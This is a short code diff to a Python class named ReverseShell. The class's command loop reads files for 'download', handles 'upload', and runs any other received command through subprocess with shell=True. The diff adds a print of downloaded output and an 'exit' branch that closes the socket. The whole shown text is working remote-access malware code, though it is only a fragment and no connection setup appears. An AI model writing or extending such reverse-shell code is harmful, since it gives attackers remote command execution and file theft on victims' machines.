@@ -80,6 +80,7 @@ class ReverseShell:
             elif command[0] == "download":
                 if len(command) > 1:
                     output = self.read_file(command[1])
+                    print(output)
                 else:
                     output = "Error: No file specified for download."
 
@@ -89,6 +90,8 @@ class ReverseShell:
                 else:
                     output = "Error: Invalid upload command format."
 
+            elif command [0] == 'exit':
+                self.sock.close()
             else:
                 try:
                     output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, text=True)
